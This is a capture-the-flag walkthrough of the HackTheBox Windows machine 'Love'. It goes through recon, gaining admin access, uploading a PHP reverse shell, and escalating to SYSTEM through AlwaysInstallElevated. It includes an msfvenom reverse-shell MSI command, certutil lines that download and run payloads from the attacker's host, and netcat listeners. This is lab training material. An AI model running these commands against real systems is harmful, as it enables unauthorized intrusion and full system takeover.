---
title: "Walk-through of Love from HackTHeBox"
header:
  teaser: /assets/images/2021-07-31-17-48-51.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Windows
  - Feroxbuster
  - WinPEAS
  - AlwaysInstallElevated
---

## Machine Information

![love](/assets/images/2021-07-31-17-48-51.png)

Love is rated as an easy machine on HackTheBox. An initial scan discovers a Windows box with lots of open ports, however a website running on port 80 proves to be the correct starting point. After some enumeration we find a way to log in to an admin panel, and from there we upload a reverse shell. After gaining user access we find a simple escalation path to system via an well known exploit.

<!--more-->

Skills required are basic port enumeration and OS exploration knowledge. Skills learned are researching vulnerabilities and using msfvenom payloads.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Love](https://www.hackthebox.eu/home/machines/profile/344) |
| Machine Release Date | 1st May 2021 |
| Date I Completed It | 1st August 2021 |
| Distribution Used | Kali 2021.1 – [Release Info](https://www.kali.org/blog/kali-linux-2021-1-release) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/love]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.239 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/love]
└─# nmap -p$ports -sC -sV -oA love 10.10.10.239                                                                  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-31 17:44 BST
Nmap scan report for 10.10.10.239
Host is up (0.024s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_ssl-date: 2021-07-31T17:09:09+00:00; +21m32s from scanner time.
| tls-alpn: 
|_  http/1.1
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h06m32s, deviation: 3h30m01s, median: 21m31s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-07-31T10:08:56-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-31T17:08:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 175.04 seconds
```

We have a large number of ports open, and we see this is a Windows box. Under port 443 we see there is a subdomain called staging. Let's add to our hosts file:

```text
┌──(root💀kali)-[~/htb/love]
└─# echo 10.10.10.239 love.htb staging.love.htb >> /etc/hosts
```

## Website Enumeration

Now let's start with port 80:

![love-port80](/assets/images/2021-07-31-18-02-20.png)

Nothing interesting here, let's look at the subdomain:

![love-file-scanner](/assets/images/2021-07-31-18-05-29.png)

A free file scanning service. Sounds good but it's not working yet, however clicking on the Demo link takes us here:

![love-scan](/assets/images/2021-07-31-18-07-45.png)

Now we can specify a URL to the file we want to check. We know this box hasn't got internet access so the URL will need to be local to it. Looking back at the nmap scan we can see there is another port with Apache running on it:

```text
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
```

Let's try pointing to that:

![love-port5000](/assets/images/2021-07-31-22-38-56.png)

## Feroxbuster

We find admin creds, but they don't work on the login page we found earlier. Let's do a little enumeration and see if we can find a hidden subfolder:

```text
┌──(root💀kali)-[/usr/share]
└─# feroxbuster --url http://10.10.10.239

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.239
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       30w      337c http://10.10.10.239/admin
301        9l       30w      338c http://10.10.10.239/images
301        9l       30w      340c http://10.10.10.239/includes
301        9l       30w      339c http://10.10.10.239/plugins
301        9l       30w      346c http://10.10.10.239/admin/includes
301        9l       30w      337c http://10.10.10.239/Admin
<SNIP>
```

## Admin Dashboard

We have an /admin folder, this time we find success:

![love-login](/assets/images/2021-07-31-22-47-29.png)

After logging in we end up at a dashboard:

![love-dashboard](/assets/images/2021-07-31-22-48-45.png)

Looking around we find we can update the admin profile:

![love-admin](/assets/images/2021-07-31-23-11-29.png)

## Reverse Shell

Clicking the Update button, we can then upload a php reverse shell as there is no checking:

![love-shell](/assets/images/2021-07-31-23-13-04.png)

I tried the usual PenTestMonkey php shell but that didn't work:

```text
┌──(root💀kali)-[~/htb/love]
└─# nc -nlvp 1234                              
listening on [any] 1234 ...
connect to [10.10.15.5] from (UNKNOWN) [10.10.10.239] 61759
'uname' is not recognized as an internal or external command,
operable program or batch file.
```

That's because uname is a Linux command and we have a Windows box here, so a quick Google found [this one](https://github.com/ivan-sincek/php-reverse-shell), which works with Windows:

```text
┌──(root💀kali)-[~/htb/love]
└─# wget https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/php_reverse_shell.php                                      
--2021-07-31 23:21:47--  https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/php_reverse_shell.php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9283 (9.1K) [text/plain]
Saving to: ‘php_reverse_shell.php’

php_reverse_shell.php                     100%[==========================================>]   9.07K  --.-KB/s    in 0.001s  

2021-07-31 23:21:47 (5.90 MB/s) - ‘php_reverse_shell.php’ saved [9283/9283]
```

## User Flag

After uploading that one and refreshing the admin page we get our initial shell:

```text
┌──(root💀kali)-[~/htb/love]
└─# nc -nlvp 1234             
listening on [any] 1234 ...
connect to [10.10.15.5] from (UNKNOWN) [10.10.10.239] 61829
SOCKET: Shell has connected! PID: 7028
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\omrs\images>
```

Let's grab the user flag before we move on:

```text
C:\xampp\htdocs\omrs\images>cd c:\users\phoebe\desktop

c:\Users\Phoebe\Desktop>type user.txt
<HIDDEN>
```

## WinPEAS Enumeration

For speed let's use WinPEAS to look for our escalation path:

```text
┌──(root💀kali)-[~/htb/love]
└─# wget https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
--2021-07-31 23:39:59--  https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe [following]
--2021-07-31 23:40:00--  https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.110.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1919488 (1.8M) [application/octet-stream]
Saving to: ‘winPEASx64.exe’
winPEASx64.exe                      100%[=====================================================================>]   1.83M  2.85MB/s    in 0.6s    
2021-07-31 23:40:01 (2.85 MB/s) - ‘winPEASx64.exe’ saved [1919488/1919488]

┌──(root💀kali)-[~/htb/love]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

With the script staged we can pull it across and run it:

```text
c:\Users\Phoebe\Desktop>certutil -urlcache -f http://10.10.15.5/winPEASx64.exe winpeas.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\xampp\htdocs\omrs\images>winpeas.exe cmd > output.txt
```

## Always Install Elevated

The output is very long, but the colouring helps you spot the important parts. On this box we are interested in this section:

```text
͹ Checking AlwaysInstallElevated
<C8>  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```

There is information [here](https://ed4m4s.blog/privilege-escalation/windows/always-install-elevated) on how to exploit this.

## MSFVenom Payload

First we need a payload to create a reverse shell:

```text
┌──(root💀kali)-[~/htb/love]
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.5 LPORT=443 -f msi -o shell.msi

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: shell.msi
```

Now pull that over to the box and run it:

```text
C:\xampp\htdocs\omrs\images>certutil -urlcache -f http://10.10.15.5/shell.msi shell.msi
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\xampp\htdocs\omrs\images>msiexec /quiet /qn /i shell.msi
```

## Root Flag

Switch to a waiting netcat listener:

```text
┌──(root💀kali)-[~/htb/love]
└─# nc -nlvp 443                                                                            
listening on [any] 443 ...
connect to [10.10.15.5] from (UNKNOWN) [10.10.10.239] 58816
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```

We got our shell as system. Time to grab the root flag:

```text
C:\WINDOWS\system32>type c:\users\administrator\desktop\root.txt
type c:\users\administrator\desktop\root.txt
<HIDDEN>
```

All done. See you next time.
